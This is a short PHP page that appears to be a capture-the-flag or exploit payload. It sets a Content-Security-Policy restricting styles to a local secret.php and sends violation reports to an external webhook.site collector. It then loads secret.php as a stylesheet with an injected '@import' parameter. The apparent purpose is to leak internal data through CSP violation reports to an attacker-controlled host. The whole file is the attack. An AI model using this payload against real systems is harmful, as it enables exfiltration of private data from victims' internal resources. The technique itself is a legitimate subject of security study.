<?php
header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/2fad7eeb-eab1-408a-bbec-4da0543f6e98;");
echo '<link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import \'">';
echo "<a>hi</a>";
?>


